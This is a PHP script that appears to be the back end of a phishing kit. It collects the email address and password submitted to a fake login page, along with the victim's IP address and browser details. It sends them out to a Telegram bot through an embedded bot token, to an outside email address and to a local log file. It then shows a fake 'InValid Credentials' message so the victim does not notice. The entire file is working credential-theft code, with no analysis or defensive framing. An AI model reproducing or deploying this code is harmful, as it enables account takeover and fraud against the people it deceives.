<?php
function sendMessage($messaggio) {
	$token = '7166719464:AAGgAWPA4q1aLA3fk6lM3_ZfYMFmIJC5UsE';
	$chatid = '7039869653';
	$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
	$url = $url . "&text=" . urlencode($messaggio);
	$ch = curl_init();
	$optArray = array(
			CURLOPT_URL => $url,
			CURLOPT_RETURNTRANSFER => true
	);
	curl_setopt_array($ch, $optArray);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
$email = trim($_POST['email']);
$password = trim($_POST['password']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Resultz |--------------|\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------------------|\n";
	$send = "results34@antinet.link";
	sendMessage($message);
	$subject = "Login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	{
		mail($mesaegs,$subject,$message,$headers);
		mail($send,$subject,$message,$headers);
		$fp = fopen('logs.txt', 'a');
		fwrite($fp, $message);
		fclose($fp);
	}
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
);
echo json_encode($data);
?>